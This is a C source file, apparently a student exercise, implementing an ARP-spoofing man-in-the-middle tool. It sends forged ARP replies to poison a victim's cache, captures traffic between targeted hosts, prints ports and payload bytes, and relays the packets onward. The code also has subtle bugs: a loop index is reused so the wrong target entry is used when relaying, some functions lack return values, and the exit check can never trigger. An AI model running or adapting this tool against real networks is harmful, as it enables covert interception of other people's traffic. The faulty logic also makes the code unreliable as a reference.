//
// Created by 김세희 on 2017. 10. 17..
//

#include "arpspoof.h"



void *infect(void *arg){
    struct spoof_arg *my_arg=(spoof_arg *)arg;
    for(int i=0;i<10;i++) {
        arp_reply(my_arg->handle, my_arg->src_ip, my_arg->dst_ip, my_arg->my_mac, my_arg->src_mac);
    }
    sleep(infect_time);
}

void f_arpspoof(pcap_t *handle,spoof_arg *sa,int pair){
    int res;
    while (true) {
        res=spoof_packet(handle,sa, pair);
        if(res==-1)
            break;
        puts("-----------------------------------------------");
    }
}

bool spoof_packet(pcap_t* handle,spoof_arg *sa,int pair){

    struct pcap_pkthdr* header;
    const u_char* packet;
    struct libnet_ethernet_hdr *eth_h;
    struct libnet_ipv4_hdr *ipv4_h;
    struct libnet_tcp_hdr *tcp_hdr;
    int i;
    int data_loc,len;
    char ipbuf[INET_ADDRSTRLEN];

    int res = pcap_next_ex(handle, &header, &packet);

    if (res == -1 || res == -2)
        return 0;

    eth_h=(struct libnet_ethernet_hdr*)packet;
    if(ntohs(eth_h->ether_type) != ETHERTYPE_IP)
        return 1;

    ipv4_h=(libnet_ipv4_hdr*)(packet+LIBNET_ETH_H);
    for(i=0;i<pair;i++) {
        if (!memcmp(&ipv4_h->ip_src, sa[i].src_ip, 4) && !memcmp(&ipv4_h->ip_dst, sa[i].dst_ip, 4)) {
            //spoofed packet

            //analyze packet

            printf("from");
            print_ip(sa[i].src_ip);
            printf("to");
            print_ip(sa[i].dst_ip);
            if(ipv4_h->ip_p == IPPROTO_TCP) {
                tcp_hdr = (libnet_tcp_hdr *) (packet + LIBNET_IPV4_H + LIBNET_ETH_H);
                printf("src_port : %d\n", ntohs(tcp_hdr->th_sport));
                printf("des_port : %d\n", ntohs(tcp_hdr->th_dport));
                data_loc=LIBNET_IPV4_H+LIBNET_ETH_H+tcp_hdr->th_off*4;
                len=header->len-data_loc;
                if(len>16){
                    len=16;
                }
                for(i=data_loc;i<data_loc+len;i++){
                    printf("%hhx ",*(packet+i));
                }

            }
            //relay packet
            memcpy(eth_h->ether_shost, sa[i].my_mac, ETHER_ADDR_LEN);
            memcpy(eth_h->ether_dhost, sa[i].dst_mac, ETHER_ADDR_LEN);
            pcap_sendpacket(handle, packet, header->len);
            break;
        }
    }

}